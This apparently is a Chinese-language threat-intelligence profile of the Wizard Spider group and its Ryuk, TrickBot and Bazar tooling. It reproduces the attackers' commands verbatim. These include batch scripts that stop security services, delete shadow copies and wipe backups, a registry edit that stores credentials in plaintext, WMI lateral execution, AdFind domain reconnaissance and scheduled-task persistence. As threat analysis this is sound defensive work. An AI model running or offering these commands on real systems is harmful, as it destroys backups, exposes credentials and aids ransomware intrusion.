# Wizard Spider

## 特征

1. Ryuk勒索软件为了保持持久性，会修改注册表HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run的值为Ryuk可执行路径.

该勒索软件会通过创建kill.bat批处理脚本停止或禁用服务，然后终止某些特定进程.

```bash
net stop avpsus /y  //停止卡巴斯基更新服务
net stop McAfeeDLPAgentService /y  //停止McAfee DLP代理服务
net stop mfewc /y  //停止McAfee Web控制服务
net stop BMR Boot Service /y  //停止BMR服务
net stop NetBackup BMR MTFTP Service /y  //停止NetBackup BMR引导服务
sc config SQLTELEMETRY start= disabled  //禁用SQL Server的 Telemetry服务
sc config SQLTELEMETRY$ECWDB2 start= disabled
sc config SQLWriter start= disabled  //禁用SQL Server的卷影复制服务
sc config SstpSvc start= disabled  //禁用SSTP支持服务
taskkill /IM mspub.exe /F  //终止Microsoft Office进程
taskkill /IM mydesktopqos.exe /F
//终止记录键盘和鼠标输入并连接到网络的进程
taskkill /IM mydesktopservice.exe /F  //终止Oracle MyDesktop进程
```

然后该勒索软件会通过windows.bat批处理脚本来使感染主机更难恢复源文件.

```bash
vssadmin Delete Shadows /all /quiet
//删除所有指定卷的卷影副本，并且运行时不显示消息
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
//指定调整最大存储空间量的C卷，然后指定存储卷为C，最后指定存储卷影副本的最大空间量为401MB
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
//在卷C上调整卷C的卷影副本的最大空间量
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
vssadmin Delete Shadows /all /quiet
del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
del /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk
del /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk
del /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk
del /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk
del /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk
//根据文件位置和扩展名删除文件。q为安静模式；s为所有子目录文件；f为关闭用户确认并强制删除文件功能
del %0  //删除正在执行的.bat脚本
```

2. 投递的TrickBot恶意软件会通过修改注册表HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest的UseLogonCredential值为1.将UseLogonCredential值设置为"1"可将Windows操作系统配置为将凭据以明文形式存储在内存中，然后通过使用凭据转储工具检索凭据.

3. 通过Bazar加载Ryuk勒索软件会通过WMI尝试横向执行恶意DLL文件:wmic /node:"DC.example.domain" process call create "rundll32 C:\PerfLogs\arti64.dll, StartW".在横向时还会尝试使用"powershell -nop -exec bypass -EncodedCommand Base64字符串，下载可执行文件和禁用Windows Defender.

然后该恶意软件会通过下载adfind.exe应用程序收集Active Directory信息.

```bash
AdFind.exe -f "(objectcategory=computer)"  //查询当前域中所有计算机
AdFind.exe -f "(objectcategory=group)"  //查询当前域中所有组
AdFind.exe -f "(objectcategory=organizationalUnit)"  //查询当前域中所有组对象
AdFind.exe -f "(objectcategory=person)"  //查询当前域中所有用户
AdFind.exe  -subnets -f "(objectCategory=subnet)"  //查询所有子网
AdFind.exe  -sc trustdmp  
AdFind.exe -gcb -sc trustdmp
//转储所有信任对象
```

该恶意软件的变体还会创建计划任务以保持持久性.

```bash
"C:\Windows\System32\schtasks.exe" /CREATE /SC ONSTART /TN jf0c /TR "'C:\Users\pagefilerpqy.exe'" /f
"C:\Windows\System32\schtasks.exe" /CREATE /SC ONSTART /TN jf0c /TR "'C:\Users\pagefilerpqy.exe'" /f /RL HIGHEST
"C:\Windows\System32\schtasks.exe" /CREATE /SC ONCE /ST 17:21:58 /TN 9T6ukfi6 /TR "'C:\Users\pagefilerpqy.exe'" /f
"C:\Windows\System32\schtasks.exe" /CREATE /SC ONCE /ST 17:21:58 /TN 9T6ukfi6 /TR "'C:\Users\pagefilerpqy.exe'" /f /RL HIGHEST
//设置运行密钥为9T6ukfi6
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V \"microsoft update\" /t REG_SZ /F /D "SCHTASKS /run /tn 9T6ukfi6"
```
